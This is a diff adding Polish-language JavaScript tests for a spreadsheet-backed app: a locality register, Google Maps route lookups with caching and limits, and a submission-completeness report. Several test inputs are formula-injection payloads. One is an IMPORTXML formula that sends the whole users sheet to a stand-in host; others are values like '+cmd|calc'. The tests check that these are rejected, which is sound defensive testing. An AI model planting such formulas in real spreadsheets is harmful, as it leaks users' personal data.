@@ -346,4 +346,119 @@ const F = '=IMPORTXML("https://zly.example/?"&JOIN(",";Uzytkownicy!A:N);"//a")';
   ok('…puls z kluczem z hasła przyciętego (tak liczy aplikacja web) oddaje komplet, z kluczem z surowego tekstu — nie', B.post({ akcja: 'puls', kod: '22222' }, { hashKlucza: B.hash('22222', 'Haslo123') }).pelne === true
     && B.post({ akcja: 'puls', kod: '22222' }, { hashKlucza: B.hash('22222', 'Haslo123 ') }).pelne === false);
 }
+/* ---- 16. rejestr miejscowości: każdy użytkownik ma własną trasę (akcja „miejscowosci”) ---- */
+{
+  const B = swiezy(); const H1 = { haslo: 'haslo123' };
+  B.post({ akcja: 'zmien_haslo', kod: '22222', stare_haslo: '501502503', nowe_haslo: 'drugie-haslo9' }); const H2 = { haslo: 'drugie-haslo9' };
+  const mies = new B.ctx.Date(B.wywolaj('Date.now()')); const M = `${mies.getFullYear()}${String(mies.getMonth() + 1).padStart(2, '0')}`;
+  const poj = (kodu, o, op = 'pobierz', extra = {}) => B.post({ akcja: 'miejscowosci', kod: kodu, miesiac: M, op, ...extra }, o);
+  ok('pusty rejestr: pobranie daje pusty zbiór i 0 osób', (() => { const r = poj('12345', H1); return r.status === 'ok' && Object.keys(r.zajete).length === 0 && r.osob === 0; })());
+  ok('zapis pierwszej osoby: przyjęty, w arkuszu jeden wiersz (miesiąc, kod, imię, liczba, lista)', (() => { const r = poj('12345', H1, 'zapisz', { miejscowosci: ['Kielce', 'Radom', 'Kędzierzyn-Koźle', 'Radom'] }); const s = B.get('Miejscowosci'); return r.status === 'ok' && r.zapisano === 3 && s.w.length === 2 && String(s.w[1][1]) === '12345' && s.w[1][4] === 'Kielce|Radom|Kędzierzyn-Koźle'; })());
+  ok('druga osoba widzi miejscowości pierwszej (licznik 1), a pierwsza własnych nie widzi (własny wpis się nie liczy)', (() => { const r2 = poj('22222', H2); const r1 = poj('12345', H1); return r2.zajete.Kielce === 1 && r2.zajete.Radom === 1 && r2.osob === 1 && Object.keys(r1.zajete).length === 0 && r1.osob === 0; })());
+  ok('druga osoba zapisuje swoje (jedna wspólna): trzecie konto widzi licznik 2 dla wspólnej i 1 dla pozostałych', (() => { poj('22222', H2, 'zapisz', { miejscowosci: ['Radom', 'Lublin'] }); B.dodajUzytkownika('44444', 'Piotr Trzeci', 'lubelskie', '2099-12-31', '', 'trzecie-haslo9'); const r = poj('44444', { haslo: 'trzecie-haslo9' }); return r.osob === 2 && r.zajete.Radom === 2 && r.zajete.Kielce === 1 && r.zajete.Lublin === 1 && r.zajete['Kędzierzyn-Koźle'] === 1; })());
+  ok('trzecie (wygasłe) konto nie korzysta z rejestru', poj('33333', H1).status === 'wygasla');
+  ok('ponowny zapis tej samej osoby ZASTĘPUJE wpis (generowanie od nowa nie zużywa puli): nadal 2 wiersze danych', (() => { poj('12345', H1, 'zapisz', { miejscowosci: ['Zamość'] }); const s = B.get('Miejscowosci'); return s.w.length === 3 && s.w.find(r => String(r[1]) === '12345')[4] === 'Zamość'; })());
+  ok('po zastąpieniu poprzednie miejscowości pierwszej osoby wróciły do puli, a nowa jest zajęta', (() => { const r = poj('22222', H2); return !('Kielce' in r.zajete) && r.zajete['Zamość'] === 1; })());
+  ok('„zwolnij” usuwa wpis i oddaje miejscowości; powtórne zwolnienie nic nie psuje', (() => { const a = poj('12345', H1, 'zwolnij'), b2 = poj('12345', H1, 'zwolnij'); const r = poj('22222', H2); return a.status === 'ok' && b2.status === 'ok' && Object.keys(r.zajete).length === 0 && B.get('Miejscowosci').w.length === 2; })());
+  const jeden = (nazwa, d, o) => { const r = B.post(d, o); ok(nazwa, r.status === 'odmowa' && !('zajete' in r), JSON.stringify(r)); };
+  jeden('odmowa: sam kod bez podpisu hasłem', { akcja: 'miejscowosci', kod: '12345', miesiac: M, op: 'pobierz' }, {});
+  jeden('odmowa: zły podpis hasłem', { akcja: 'miejscowosci', kod: '12345', miesiac: M, op: 'pobierz' }, { haslo: 'zle-haslo' });
+  jeden('odmowa: cudze hasło (drugie konto podpisuje kod pierwszego)', { akcja: 'miejscowosci', kod: '12345', miesiac: M, op: 'zapisz', miejscowosci: ['Lublin'] }, H2);
+  jeden('odmowa: nieznany kod', { akcja: 'miejscowosci', kod: '99999', miesiac: M, op: 'pobierz' }, H1);
+  jeden('odmowa: kod ze śmieciami', { akcja: 'miejscowosci', kod: '12x45', miesiac: M, op: 'pobierz' }, H1);
+  const zle = [['miesiąc spoza zakresu', { miesiac: '190001' }], ['miesiąc to nie liczba', { miesiac: 'wrzesien' }], ['brak miesiąca', { miesiac: '' }], ['nieznana operacja', { op: 'skasuj_wszystko' }]];
+  for (const [opis, extra] of zle) { const r = B.post({ akcja: 'miejscowosci', kod: '12345', miesiac: M, op: 'pobierz', ...extra }, H1); ok(`błąd zamiast zapisu: ${opis}`, r.status === 'blad', JSON.stringify(r)); }
+  const F2 = '=IMPORTXML("https://zly.example/?"&JOIN(",";Uzytkownicy!A:N);"//a")';
+  for (const [opis, lista] of [['formuła w nazwie', [F2]], ['nazwa zaczynająca się od =', ['=1+1']], ['nazwa od plusa', ['+cmd|calc']], ['nazwa od małpy', ['@SUM(1)']], ['nazwa od cyfry', ['1234']], ['pusta nazwa', ['']], ['za długa nazwa', ['A'.repeat(41)]], ['obiekt zamiast tekstu', [{ a: 1 }]], ['nie tablica', 'Kielce'], ['za dużo miejscowości', Array.from({ length: 251 }, (_, i) => 'Miasto' + String.fromCharCode(65 + (i % 26)) + String.fromCharCode(65 + Math.floor(i / 26)))]]) {
+    const r = poj('12345', H1, 'zapisz', { miejscowosci: lista }); ok(`zapis odrzucony: ${opis}`, r.status === 'blad', JSON.stringify(r).slice(0, 80));
+  }
+  ok('po odrzuconych zapisach w arkuszu nie ma ani śladu formuły ani nowych wierszy', B.formuly().length === 0 && B.get('Miejscowosci').w.length === 2, JSON.stringify(B.formuly()));
+  ok('nazwy z polskimi znakami, spacją, kropką i apostrofem przechodzą', (() => { const r = poj('12345', H1, 'zapisz', { miejscowosci: ['Łódź', 'Ząbki', 'Nowy Dwór Mazowiecki', 'Jastrzębie-Zdrój', "O'Brien", 'Św. Katarzyna'] }); return r.status === 'ok' && r.zapisano === 6; })());
+  ok('dokładnie 250 miejscowości jest jeszcze dozwolone', (() => { const l = Array.from({ length: 250 }, (_, i) => 'Wies' + String.fromCharCode(65 + (i % 26)) + String.fromCharCode(65 + Math.floor(i / 26))); return poj('22222', H2, 'zapisz', { miejscowosci: l }).zapisano === 250; })());
+  ok('bez podpisu aplikacji rejestr też nie odpowiada, gdy podpis jest obowiązkowy', (() => { const S = swiezy({ podpisObowiazkowy: true }); const r = S.post({ akcja: 'miejscowosci', kod: '12345', miesiac: M, op: 'pobierz' }, { bezPodpisu: true }); return r.opis === 'odmowa' && !('zajete' in r); })());
+  ok('wpisy w Log: zapis zostawia ślad (kto, miesiąc, ile)', B.get('Log').w.some(r => r[1] === '12345' && r[2] === 'miejscowosci' && new RegExp(M).test(r[3])));
+  ok('PESEL ani adres nie trafiają do rejestru: w arkuszu tylko miesiąc, kod, imię, liczba, lista, czas', B.get('Miejscowosci').w[0].join() === 'Miesiac,Kod,Imie i nazwisko,Liczba,Miejscowosci,Zapisano');
+  // przycinanie: arkusz urósł ponad limit wierszy → przy zapisie znikają wpisy sprzed 14 miesięcy, świeże zostają
+  { const S = swiezy(); const sh = S.get('Miejscowosci') || S.wywolaj('SpreadsheetApp.getActiveSpreadsheet().getSheetByName("Miejscowosci")');
+    const stary = (mies.getFullYear() - 2) * 100 + 5; const swiezyMies = Number(M);
+    for (let i = 0; i < 4000; i++) sh.appendRow([i < 3990 ? stary : swiezyMies, String(40000 + i), 'x', 1, 'Kielce', new Date()]);
+    S.post({ akcja: 'miejscowosci', kod: '12345', miesiac: M, op: 'zapisz', miejscowosci: ['Radom'] }, { haslo: 'haslo123' });
+    ok('przycinanie: stare miesiące (sprzed 14) znikają, świeże i nowy wpis zostają', sh.w.length === 1 + 10 + 1 && sh.w.every((r, i) => i === 0 || Number(r[0]) >= Number(M) - 100), String(sh.w.length)); }
+}
+/* ---- 17. drogi z Google Maps (akcja „droga”): dokładny odcinek z adresu zamieszkania ---- */
+{
+  const B = swiezy(); const H1 = { haslo: 'haslo123' };
+  const dr = (pary, o = H1, kodu = '12345') => B.post({ akcja: 'droga', kod: kodu, pary }, o);
+  const RADOM = [51.4027, 21.1471], KIELCE = [50.8661, 20.6286], LUBLIN = [51.2465, 22.5684], PULAWY = [51.4166, 21.9697];
+  const prosta = (a, b) => { const p = Math.PI / 180; return 6371 * Math.hypot((b[1] - a[1]) * p * Math.cos((a[0] + b[0]) * p / 2), (b[0] - a[0]) * p); };
+  const r1 = dr([[...RADOM, ...KIELCE], [...RADOM, ...LUBLIN], [...RADOM, ...PULAWY]]);
+  ok('trzy odcinki: wynik ze wszystkich (km z usługi Maps, minuty), bez „limit”', r1.status === 'ok' && r1.limit === false && r1.wyniki.length === 3 && r1.wyniki.every(x => x && x.km > 0 && x.min > 0) && B.maps.wywolania === 3, JSON.stringify(r1).slice(0, 160));
+  ok('km zgadzają się z usługą (linia prosta × 1,25, zaokrąglone do 0,1 km)', Math.abs(r1.wyniki[0].km - prosta(RADOM, KIELCE) * 1.25) < 0.06, String(r1.wyniki[0].km));
+  const przed = B.maps.wywolania; const r2 = dr([[...KIELCE, ...RADOM], [...RADOM, ...LUBLIN]]);
+  ok('ta sama para (także w odwrotnym kierunku) wraca z pamięci skryptu — usługa Maps nie jest pytana drugi raz', B.maps.wywolania === przed && r2.wyniki[0].km === r1.wyniki[0].km && r2.wyniki[1].km === r1.wyniki[1].km);
+  const z0 = B.blokada.zwolnien; B.maps.zwolnieniaPrzyWywolaniu.length = 0; const w0 = B.maps.wywolania;
+  dr([[...PULAWY, ...LUBLIN]]);
+  ok('blokada jest zwolniona PRZED zapytaniem do Google (logowanie innych nie czeka na Maps) i tylko raz', B.maps.wywolania === w0 + 1 && B.maps.zwolnieniaPrzyWywolaniu[0] === z0 + 1 && B.blokada.zwolnien === z0 + 1, `${B.maps.zwolnieniaPrzyWywolaniu[0]} / ${z0} / ${B.blokada.zwolnien}`);
+  const odm = [['sam kod, bez podpisu hasłem', {}, '12345'], ['zły podpis hasłem', { haslo: 'zle-haslo' }, '12345'], ['nieznany kod', H1, '99999'], ['cudze hasło', { haslo: 'haslo123' }, '22222']];
+  const wMaps = B.maps.wywolania;
+  for (const [opis, o, kodu] of odm) { const r = dr([[...RADOM, ...KIELCE]], o, kodu); ok(`odmowa bez wyników: ${opis}`, r.status === 'odmowa' && !('wyniki' in r), JSON.stringify(r)); }
+  ok('konto wygasłe (33333) dostaje „wygasla”, a Google nie jest pytany', dr([[...RADOM, ...KIELCE]], H1, '33333').status === 'wygasla' && B.maps.wywolania === wMaps);
+  const zle = [['poza Polską (Berlin)', [[52.52, 13.405, ...RADOM]]], ['poza Polską (Wiedeń)', [[...RADOM, 48.2082, 16.3738]]], ['odcinek za długi (Gdańsk–Zakopane)', [[54.352, 18.6466, 49.2992, 19.9496]]], ['pusta lista', []], ['para nie jest czwórką liczb', [[1, 2, 3]]],
+    ['współrzędne jako napisy', [['51.4', '21.1', '50.8', '20.6']]], ['NaN', [[NaN, 21.1, ...KIELCE]]], ['za dużo par (61)', Array.from({ length: 61 }, () => [...RADOM, ...KIELCE])], ['nie tablica', 'Radom-Kielce']];
+  for (const [opis, pary] of zle) { const r = dr(pary); ok(`błąd zamiast zapytania do Google: ${opis}`, r.status === 'blad' && B.maps.wywolania === wMaps, JSON.stringify(r).slice(0, 90)); }
+  ok('współrzędne nie trafiają do arkusza ani do dziennika (tylko liczba par)', !JSON.stringify([...B.zak.values()].map(z => z.w)).match(/51\.40|21\.14|50\.86|20\.62|22\.56/) && B.get('Log').w.some(r => r[2] === 'droga' && /par/.test(r[3])));
+  { const S = swiezy(); S.maps.odpowiedz = (a, b) => ({ status: 'OK', routes: [{ legs: [{ distance: { value: prosta(a, b) * 6000 }, duration: { value: 3600 } }] }] });
+    const r = S.post({ akcja: 'droga', kod: '12345', pary: [[...RADOM, ...KIELCE]] }, H1); ok('niedorzeczny wynik z Google (6× linia prosta) → null (aplikacja zostaje przy tabeli)', r.status === 'ok' && r.wyniki[0] === null, JSON.stringify(r).slice(0, 100));
+    S.maps.odpowiedz = () => ({ status: 'ZERO_RESULTS', routes: [] }); const r3 = S.post({ akcja: 'droga', kod: '12345', pary: [[...RADOM, ...LUBLIN]] }, H1); ok('brak trasy w Google → null, bez błędu serwera', r3.status === 'ok' && r3.wyniki[0] === null); }
+  { const S = swiezy(); S.maps.wyjatek = true;
+    const r = S.post({ akcja: 'droga', kod: '12345', pary: [[...RADOM, ...KIELCE], [...RADOM, ...LUBLIN]] }, H1);
+    ok('wyczerpany dzienny limit usługi Maps → status ok, limit:true, wyniki null (bez błędu serwera)', r.status === 'ok' && r.limit === true && r.wyniki.every(x => x === null), JSON.stringify(r).slice(0, 120)); }
+  { const S = swiezy(); const mnog = (i) => [51.4 + i * 0.001, 21.1, ...KIELCE];
+    const por = od => S.post({ akcja: 'droga', kod: '12345', pary: Array.from({ length: 60 }, (_, i) => mnog(od + i)) }, H1);
+    const a = por(0), a2 = por(100), b2 = por(200);
+    ok('limit na konto (160 nowych par w oknie): dwa zapytania po 60 policzone, z trzeciego tylko 40, reszta null i limit:true', a.limit === false && a2.limit === false && a.wyniki.every(Boolean) && a2.wyniki.every(Boolean) && b2.limit === true && b2.wyniki.filter(Boolean).length === 40 && S.maps.wywolania === 160, `${S.maps.wywolania} wywołań, limit ${b2.limit}`);
+    const c = S.post({ akcja: 'droga', kod: '22222', pary: [[...RADOM, ...KIELCE]] }, { haslo: '501502503' });
+    ok('limit jednego konta nie blokuje innych (konto bez hasła dostaje odmowę, nie limit)', c.status === 'odmowa'); }
+  { const S = swiezy(); S.post({ akcja: 'zmien_haslo', kod: '22222', stare_haslo: '501502503', nowe_haslo: 'drugie-haslo9' });
+    const sw = k => ({ akcja: 'droga', kod: k, pary: Array.from({ length: 60 }, (_, i) => [51.4 + i * 0.0013, (k === '12345' ? 21.2 : 21.6) + i * 0.0001, ...KIELCE]) });
+    S.post(sw('12345'), H1); S.post(sw('22222'), { haslo: 'drugie-haslo9' });
+    ok('dwa konta liczą osobno, a wspólny bezpiecznik (240 par) jeszcze nie zadziałał', S.maps.wywolania === 120); }
+  ok('autoryzujMapy() uruchamia się i zwraca odcinek Radom–Kielce', (() => { const x = B.wywolaj('autoryzujMapy()'); return x && x.km > 70 && x.km < 120; })());
+}
+/* ---- 18. „kto złożył” (akcja „zlozono”) i raport kompletności ---- */
+{
+  const B = swiezy(); const H1 = { haslo: 'haslo123' };
+  const mies = (d = new Date()) => d.getFullYear() * 100 + d.getMonth() + 1, M0 = String(mies()), M1 = String(mies(new Date(new Date().getFullYear(), new Date().getMonth() - 1, 1)));
+  const SK = 'a'.repeat(64), SK2 = 'b'.repeat(64);
+  const zl = (o = {}, h = H1, kodu = '12345') => B.post(Object.assign({ akcja: 'zlozono', kod: kodu, op: 'zloz', miesiac: M1, liczba: 3, skrot: SK, sposob: 'folder' }, o), h);
+  const r1 = zl();
+  ok('zgłoszenie: status ok, jeden wiersz w „Zlozone” (miesiąc, kod, imię, liczba, skrót, sposób, razy 1, status „zlozono”)', r1.status === 'ok' && r1.razy === 1 && B.get('Zlozone').w.length === 2 && (w => String(w[0]) === M1 && w[1] === '12345' && w[2] === 'Jan Testowy' && w[4] === 3 && w[5] === SK && w[6] === 'folder' && w[7] === 1 && w[8] === 'zlozono')(B.get('Zlozone').w[1]), JSON.stringify(B.get('Zlozone').w[1]));
+  const r2 = zl({ skrot: SK2, liczba: 4, sposob: 'poczta' });
+  ok('ponowne zgłoszenie tego samego miesiąca aktualizuje wiersz (nie dopisuje drugiego) i zwiększa „Razy”', r2.razy === 2 && B.get('Zlozone').w.length === 2 && B.get('Zlozone').w[1][5] === SK2 && B.get('Zlozone').w[1][4] === 4 && B.get('Zlozone').w[1][6] === 'poczta');
+  zl({ miesiac: M0 }); ok('inny miesiąc to osobny wiersz', B.get('Zlozone').w.length === 3);
+  ok('cofnięcie ustawia status „cofnieto” (wiersz zostaje, ślad po wysłaniu też)', zl({ op: 'cofnij' }).status === 'ok' && B.get('Zlozone').w[1][8] === 'cofnieto' && B.get('Zlozone').w[1][5] === SK2);
+  ok('cofnięcie miesiąca bez zgłoszenia nie zakłada wiersza', zl({ op: 'cofnij', miesiac: '202001' }).status === 'blad' || B.get('Zlozone').w.length === 3);
+  ok('ponowne wysłanie po cofnięciu przywraca status „zlozono” i liczy kolejny raz', zl({ skrot: SK }).razy === 3 && B.get('Zlozone').w[1][8] === 'zlozono');
+  ok('w „Log” jest ślad zgłoszenia, bez skrótu i bez dokumentów', B.get('Log').w.some(r => r[2] === 'zlozono' && /plikow/.test(String(r[3]))) && !JSON.stringify(B.get('Log').w).includes(SK));
+  const wZl = B.get('Zlozone').w.length;
+  const odm = [['sam kod, bez podpisu hasłem', {}, '12345'], ['zły podpis hasłem', { haslo: 'zle-haslo' }, '12345'], ['nieznany kod', H1, '99999'], ['cudze hasło', { haslo: 'haslo123' }, '22222']];
+  for (const [opis, o, kodu] of odm) ok(`odmowa, nic nie zapisane: ${opis}`, zl({}, o, kodu).status === 'odmowa' && B.get('Zlozone').w.length === wZl);
+  ok('konto wygasłe (33333) dostaje „wygasla”, nic nie zapisane', zl({}, H1, '33333').status === 'wygasla' && B.get('Zlozone').w.length === wZl);
+  const zle = [['miesiąc spoza zakresu', { miesiac: '201001' }], ['miesiąc nie jest liczbą', { miesiac: 'zeszly' }], ['liczba plików 0', { liczba: 0 }], ['liczba plików 61', { liczba: 61 }], ['skrót za krótki', { skrot: 'abc' }], ['skrót nie jest szesnastkowy', { skrot: 'z'.repeat(64) }], ['sposób spoza listy', { sposob: '=IMPORTXML("x")' }], ['nieznana operacja', { op: 'usun' }]];
+  for (const [opis, o] of zle) ok(`błąd zamiast zapisu: ${opis}`, zl(o).status === 'blad' && B.get('Zlozone').w.length === wZl, JSON.stringify(zl(o)).slice(0, 80));
+  ok('żadne pole nie trafiło do arkusza jako formuła', B.formuly().length === 0, JSON.stringify(B.formuly()));
+  // raport kompletności (uruchamiany przez właściciela w edytorze)
+  const rap = B.wywolaj('odswiezKompletnosc()'); const sh = B.get('Kompletnosc');
+  ok('raport: tylko konta z ważnym dostępem (12345 i 22222; wygasłe 33333 pomijamy)', rap.uzytkownikow === 2 && sh.w.length === 3 && !sh.w.some(r => r[0] === '33333'), JSON.stringify(rap));
+  ok('raport: brak złożenia poprzedniego miesiąca wyświetla się jako BRAK i jest na górze', sh.w[1][0] === '22222' && sh.w[1][3] === 'BRAK' && /^zlozono /.test(sh.w[2][3]) && sh.w[2][0] === '12345', JSON.stringify(sh.w));
+  ok('raport: wiersz osoby, która złożyła, pokazuje datę, sposób i liczbę plików', /^zlozono \d{4}-\d\d-\d\d \d\d:\d\d \(folder, 3 plikow\)$/.test(sh.w[2][3]), sh.w[2][3]);
+  zl({ op: 'cofnij' }); B.wywolaj('odswiezKompletnosc()');
+  ok('raport po cofnięciu: COFNIETO (nie „złożono”)', B.get('Kompletnosc').w.some(r => r[0] === '12345' && r[3] === 'COFNIETO'));
+  ok('raport: same wartości, żadnych formuł (nagłówki i komórki)', B.formuly().length === 0);
+  // przycinanie
+  { const S = swiezy(); const sh2 = S.get('Zlozone') || (S.wywolaj("_zakladka(SpreadsheetApp.getActiveSpreadsheet(), ZAKLADKA_ZLOZONE, NAGLOWKI_ZLOZONE)"));
+    const stare = Array.from({ length: 4001 }, (_, i) => ['201001', 'x' + i, 'Stary', new Date(), 1, SK, 'plik', 1, 'zlozono']); stare.forEach(r => sh2.appendRow(r));
+    S.post({ akcja: 'zlozono', kod: '12345', op: 'zloz', miesiac: M0, liczba: 1, skrot: SK, sposob: 'plik' }, H1);
+    ok('arkusz „Zlozone” po przekroczeniu 4000 wierszy odrzuca wpisy starsze niż 24 miesiące', S.get('Zlozone').w.length < 100 && S.get('Zlozone').w.some(r => r[1] === '12345'), String(S.get('Zlozone').w.length)); }
+}
 process.exit(kod);
